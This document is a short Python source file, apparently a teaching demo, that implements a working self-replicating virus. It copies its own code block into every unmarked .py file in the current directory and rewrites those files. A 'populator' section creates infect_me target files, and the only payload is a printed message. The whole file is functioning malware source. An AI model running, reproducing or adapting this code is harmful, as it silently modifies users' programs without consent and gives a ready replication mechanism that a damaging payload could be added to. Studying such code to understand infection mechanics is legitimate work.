# VIRUS CODE BEGIN
from enum import IntFlag
import sys, re, glob

# copy every line in virus code and put it into a list
virus_code = []

# open this file and read its lines

this_files_name = sys.argv[0] # this give us the file name. sys.argv is a list of arguments passed into every parogram, the first element is the name of the program
virus_file = open(this_files_name, 'r')
this_files_lines = virus_file.readlines()

# filter out lines that are not in the virus code
# save virus lines into a list to insert into other code later on
is_virus_code = False
for line in this_files_lines: # itterate through the lines of this file
    if(re.search("^# VIRUS CODE BEGIN", line)): 
        is_virus_code = True
    if(is_virus_code): # if we're in the virus code then start adding those lines to virus_code list
        virus_code.append(line)

        if(re.search("^# VIRUS CODE END", line)):
            #is_virus_code = False
            break

# find the files we can infect with the virus
programs = glob.glob('*.py') # glob.glob looks in this directory and finds any file matching the extension string
# check and infect all the programs found by glob
for program in programs:
    program_file = open(program, 'r')
    program_code = program_file.readlines()
    program_file.close()

    #check if the file has already been invected
    infected = False
    for line in program_code:
        if(re.search("# VIRUS CODE BEGIN", line)):
            infected = True
            break
        # stop infecting the program. It's already infected!
    if infected == False:
        infected_code = program_code
        # infected_code is the code of the program with the virus added to it
        infected_code.extend(['\n'])
        infected_code.extend(virus_code)
        # write a new (infected) version of the program file that will replace the original
        infected_file = open(program, 'w')
        infected_file.writelines(infected_code)
        infected_file.close()

# this is the payload!
print('Thank you for infecting me!')

### START POPULATOR CODE ###

num_new_infectibles = 5
infectible_code = ['print("Please infect me!")']

programs = glob.glob('*infect_me_*.py') # finds all the infectible files

new_infectible_nums = []

# get the highest number infectible file
if len(programs) > 0:
    nums =[]
    for program in programs:
        num = re.sub('\D+', '', program)
        nums.append(int(num))
    nums.sort(reverse = True)
    last_infectable_file_num = nums[0]
    new_infectible_nums = [*range(last_infectable_file_num + 1, last_infectable_file_num + num_new_infectibles + 1)]
else:
    new_infectible_nums = [*range(1, num_new_infectibles + 1)]

# create the new files, fresh and ready to infect

for num in new_infectible_nums:
    new_file_name = 'infect_me_' + str(num) + '.py'
    new_file = open(new_file_name, 'w')
    new_file.writelines(infectible_code)

### END POPULATOR CODE ###


# VIRUS CODE END